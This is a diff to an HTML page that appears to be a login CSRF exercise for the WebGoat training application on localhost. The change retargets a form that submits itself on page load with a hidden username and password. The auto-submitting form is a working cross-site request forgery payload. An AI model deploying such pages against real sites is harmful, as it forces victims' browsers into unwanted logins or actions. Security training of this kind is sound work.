@@ -1,8 +1,10 @@
 <html>
 <body onload="document.forms[0].submit()">
-    <form action="http://localhost:8080/WebGoat/login" method="POST">
-        <input type="hidden" name="username" value="csrf-kt09552n" />
-        <input type="hidden" name="password" value="newpw@9988" />
-    </form>
+
+<form action="http://localhost:8080/WebGoat/csrf/login" method="POST">
+    <input type="hidden" name="username" value="csrf-kt09552n" />
+    <input type="hidden" name="password" value="newpw@9988" />
+</form>
+
 </body>
 </html>
